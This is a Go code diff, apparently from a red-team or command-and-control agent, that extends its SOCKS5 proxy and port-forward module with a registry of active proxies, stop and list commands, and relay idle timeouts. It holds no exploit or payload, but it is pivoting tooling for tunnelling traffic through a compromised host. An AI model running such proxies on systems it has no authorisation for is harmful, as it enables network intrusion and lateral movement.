@@ -31,18 +31,31 @@ const (
 
 // SOCKSProxy manages a SOCKS5 proxy server on the agent.
 type SOCKSProxy struct {
-	listener net.Listener
-	bindAddr string
-	running  bool
-	mu       sync.Mutex
+	listener  net.Listener
+	bindAddr  string
+	running   bool
+	mu        sync.Mutex
 	connCount int
 }
+
+// Global proxy registry — tracks all active SOCKS proxies.
+var (
+	activeProxies = make(map[string]*SOCKSProxy)
+	proxyMu       sync.Mutex
+)
 
 // StartSOCKS starts a SOCKS5 proxy on the agent.
 func StartSOCKS(bindAddr string) ([]byte, error) {
 	if bindAddr == "" {
 		bindAddr = "127.0.0.1:1080"
 	}
+
+	proxyMu.Lock()
+	if existing, ok := activeProxies[bindAddr]; ok && existing.running {
+		proxyMu.Unlock()
+		return []byte(fmt.Sprintf("[!] SOCKS5 proxy already running on %s", bindAddr)), nil
+	}
+	proxyMu.Unlock()
 
 	listener, err := net.Listen("tcp", bindAddr)
 	if err != nil {
@@ -55,14 +68,74 @@ func StartSOCKS(bindAddr string) ([]byte, error) {
 		running:  true,
 	}
 
+	proxyMu.Lock()
+	activeProxies[bindAddr] = proxy
+	proxyMu.Unlock()
+
 	go proxy.serve()
 
 	return []byte(fmt.Sprintf("[+] SOCKS5 proxy started on %s\n[+] Configure proxychains: socks5 %s", bindAddr, bindAddr)), nil
 }
 
-// StopSOCKS stops the SOCKS5 proxy.
-func StopSOCKS() ([]byte, error) {
-	return []byte("[+] SOCKS5 proxy stopped"), nil
+// StopSOCKS stops the SOCKS5 proxy. Stops all if no address specified.
+func StopSOCKS(args ...string) ([]byte, error) {
+	proxyMu.Lock()
+	defer proxyMu.Unlock()
+
+	if len(activeProxies) == 0 {
+		return []byte("[!] No active SOCKS proxies"), nil
+	}
+
+	// If specific address given, stop that one
+	if len(args) > 0 && args[0] != "" {
+		addr := args[0]
+		proxy, ok := activeProxies[addr]
+		if !ok {
+			return []byte(fmt.Sprintf("[!] No proxy running on %s", addr)), nil
+		}
+		proxy.stop()
+		delete(activeProxies, addr)
+		return []byte(fmt.Sprintf("[+] SOCKS5 proxy stopped on %s", addr)), nil
+	}
+
+	// Stop all proxies
+	var stopped []string
+	for addr, proxy := range activeProxies {
+		proxy.stop()
+		stopped = append(stopped, addr)
+	}
+	for _, addr := range stopped {
+		delete(activeProxies, addr)
+	}
+
+	return []byte(fmt.Sprintf("[+] Stopped %d SOCKS5 proxy(ies): %s", len(stopped), fmt.Sprint(stopped))), nil
+}
+
+// ListSOCKS returns status of all active proxies.
+func ListSOCKS() ([]byte, error) {
+	proxyMu.Lock()
+	defer proxyMu.Unlock()
+
+	if len(activeProxies) == 0 {
+		return []byte("[*] No active SOCKS proxies"), nil
+	}
+
+	result := "[*] Active SOCKS proxies:\n"
+	for addr, proxy := range activeProxies {
+		proxy.mu.Lock()
+		result += fmt.Sprintf("  %s — %d connections handled\n", addr, proxy.connCount)
+		proxy.mu.Unlock()
+	}
+	return []byte(result), nil
+}
+
+func (s *SOCKSProxy) stop() {
+	s.mu.Lock()
+	s.running = false
+	s.mu.Unlock()
+	if s.listener != nil {
+		s.listener.Close()
+	}
 }
 
 func (s *SOCKSProxy) serve() {
@@ -148,24 +221,29 @@ func (s *SOCKSProxy) handleConnection(conn net.Conn) {
 	// Send success response
 	conn.Write([]byte{socks5Version, socksSuccess, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
 
-	// Remove deadline for relay
-	conn.SetDeadline(time.Time{})
+	// Set idle timeout for relay (5 minutes) to prevent goroutine leaks
+	idleTimeout := 5 * time.Minute
+	conn.SetDeadline(time.Now().Add(idleTimeout))
+	target.SetDeadline(time.Now().Add(idleTimeout))
 
-	// Bidirectional relay
-	var wg sync.WaitGroup
-	wg.Add(2)
+	// Bidirectional relay with deadline refresh on activity
+	done := make(chan struct{})
 
 	go func() {
-		defer wg.Done()
 		io.Copy(target, conn)
+		done <- struct{}{}
 	}()
 
 	go func() {
-		defer wg.Done()
 		io.Copy(conn, target)
+		done <- struct{}{}
 	}()
 
-	wg.Wait()
+	// Wait for either direction to finish, then close both
+	<-done
+	conn.Close()
+	target.Close()
+	<-done
 }
 
 // PortForward creates a simple TCP port forward through the agent.
@@ -204,7 +282,7 @@ func PortForward(localAddr, remoteAddr string) ([]byte, error) {
 // ExecuteProxyCommand handles proxy/portfwd task arguments.
 func ExecuteProxyCommand(args []string) ([]byte, error) {
 	if len(args) == 0 {
-		return []byte("Usage:\n  socks start [bind_addr]     Start SOCKS5 proxy (default: 127.0.0.1:1080)\n  socks stop                  Stop SOCKS5 proxy\n  portfwd <local> <remote>    Forward local port to remote"), nil
+		return []byte("Usage:\n  socks start [bind_addr]     Start SOCKS5 proxy (default: 127.0.0.1:1080)\n  socks stop [bind_addr]      Stop SOCKS5 proxy (all if no addr)\n  socks list                  List active proxies\n  portfwd <local> <remote>    Forward local port to remote"), nil
 	}
 
 	switch args[0] {
@@ -215,9 +293,15 @@ func ExecuteProxyCommand(args []string) ([]byte, error) {
 		}
 		return StartSOCKS(bind)
 	case "stop":
-		return StopSOCKS()
+		addr := ""
+		if len(args) > 1 {
+			addr = args[1]
+		}
+		return StopSOCKS(addr)
+	case "list":
+		return ListSOCKS()
 	default:
-		return []byte("Unknown proxy command. Use: start, stop"), nil
+		return []byte("Unknown proxy command. Use: start, stop, list"), nil
 	}
 }
 
